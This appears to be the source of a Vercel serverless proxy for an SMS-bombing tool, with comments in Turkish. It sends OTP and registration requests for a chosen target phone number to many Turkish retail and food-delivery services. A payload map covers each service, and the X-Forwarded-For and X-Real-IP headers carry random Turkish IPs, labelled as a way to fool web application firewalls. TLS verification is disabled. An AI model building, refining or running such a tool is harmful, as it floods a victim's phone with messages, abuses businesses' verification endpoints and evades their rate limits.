// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// SSL Bypass (Legacy sistemler için şart)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// Rastgele Türk IP Üretici (WAF Kandırmaca)
const getRandomTurkishIP = () => {
  const blocks = [
    [88, 224, 255], // TTNet
    [85, 96, 111],  // TTNet
    [176, 216, 223], // Superonline
    [195, 174, 175], // Vodafone
    [94, 54, 55]     // TurkNet
  ];
  const block = blocks[Math.floor(Math.random() * blocks.length)];
  const part1 = block[0];
  const part2 = Math.floor(Math.random() * (block[2] - block[1] + 1)) + block[1];
  const part3 = Math.floor(Math.random() * 255);
  const part4 = Math.floor(Math.random() * 255);
  return `${part1}.${part2}.${part3}.${part4}`;
};

const formatPhone = (p: string) => {
  const raw = p.replace(/\D/g, '');
  return {
    raw: raw.startsWith('90') ? raw.substring(2) : (raw.startsWith('0') ? raw.substring(1) : raw), // 555...
    with90: raw.startsWith('90') ? raw : (raw.startsWith('0') ? '9' + raw : '90' + raw), // 90555...
    with0: raw.startsWith('90') ? '0' + raw.substring(2) : (raw.startsWith('0') ? raw : '0' + raw), // 0555...
  };
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS - Herkese açık
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    let body: any = {};
    try { body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body; } catch {}
    
    if (!body.serviceUrl) return res.status(400).json({ error: 'Missing URL' });

    let targetUrl = body.serviceUrl.trim();
    if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;

    const phones = formatPhone(body.targetPhone || '5555555555');
    const serviceId = (body.serviceId || '').toLowerCase();
    
    // --- KESİN ÇALIŞAN PAYLOAD HARİTASI ---
    let payload = {};

    if (serviceId.includes('kahve')) payload = { countryCode: "90", phoneNumber: phones.raw };
    else if (serviceId.includes('english')) payload = { Phone: phones.with0, Source: "WEB" };
    else if (serviceId.includes('file')) payload = { mobilePhoneNumber: phones.with90 };
    else if (serviceId.includes('dominos')) payload = { mobilePhone: phones.raw, isSure: true }; // isSure true olmalı
    else if (serviceId.includes('hayat')) payload = { mobilePhoneNumber: phones.with0, deviceId: "web" };
    else if (serviceId.includes('yapp')) payload = { phone_number: phones.raw };
    else if (serviceId.includes('suiste')) payload = { gsm: phones.raw, action: "register" };
    else if (serviceId.includes('baydoner')) payload = { Gsm: phones.raw, Name: "M", Surname: "K", Kvkk: true };
    else if (serviceId.includes('komagene')) payload = { Telefon: phones.raw, FirmaId: 32 };
    else if (serviceId.includes('lc_waikiki')) payload = { PhoneNumber: phones.raw };
    else if (serviceId.includes('defacto')) payload = { MobilePhone: phones.raw };
    else if (serviceId.includes('koton')) payload = { mobile: phones.raw, sms_permission: true };
    else if (serviceId.includes('mavi')) payload = { phone: phones.raw, kvkk: true };
    else if (serviceId.includes('flo')) payload = { mobile: phones.raw };
    else if (serviceId.includes('tikla')) {
        // Tikla Gelsin özel durum
        payload = { 
            operationName: "GENERATE_OTP", 
            variables: { phone: phones.raw, countryCode: "TR" }, 
            query: "mutation GENERATE_OTP($phone: String!, $countryCode: String) { generateOtp(phone: $phone, countryCode: $countryCode) { isSuccess message } }" 
        };
    }
    else {
        // Diğerleri için varsayılan (Genelde raw isterler)
        payload = { phone: phones.raw, mobile: phones.raw };
    }

    // --- IP SPOOFING (KİMLİK GİZLEME) ---
    const fakeIP = getRandomTurkishIP();
    
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': new URL(targetUrl).origin,
      'Referer': new URL(targetUrl).origin + '/',
      'X-Forwarded-For': fakeIP,
      'X-Real-IP': fakeIP
    };

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);

    // İSTEK ANI
    let response;
    try {
        response = await fetch(targetUrl, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(payload),
            signal: controller.signal
        });
    } catch (fetchErr: any) {
        clearTimeout(timeout);
        // Fetch hatası (DNS, Network vs)
        return res.status(200).json({
            reachable: false,
            ok: false,
            status: 500,
            upstreamStatus: 0,
            error: fetchErr.message || "Network Error"
        });
    }

    clearTimeout(timeout);
    
    // Yanıtı al (Text olarak al ki JSON parse hatası olmasın)
    let responseText = "";
    try { responseText = await response.text(); } catch {}

    // Yanıt Başarılı mı? (200-299)
    // SİMÜLATÖRÜN BEKLEDİĞİ FORMAT BUDUR:
    return res.status(200).json({
        reachable: true,
        ok: response.ok, // Bu true ise simülatör yeşil yakar
        status: 200,     // Proxy her zaman 200 döner
        upstreamStatus: response.status, // Asıl sitenin cevabı (200, 400, 500)
        serviceId: body.serviceId,
        responsePreview: responseText.substring(0, 200), // Logda ne döndüğünü görmek için
        error: response.ok ? null : `Upstream Status: ${response.status}`
    });

  } catch (error: any) {
    return res.status(500).json({ error: 'Internal Proxy Error', details: error.message });
  }
}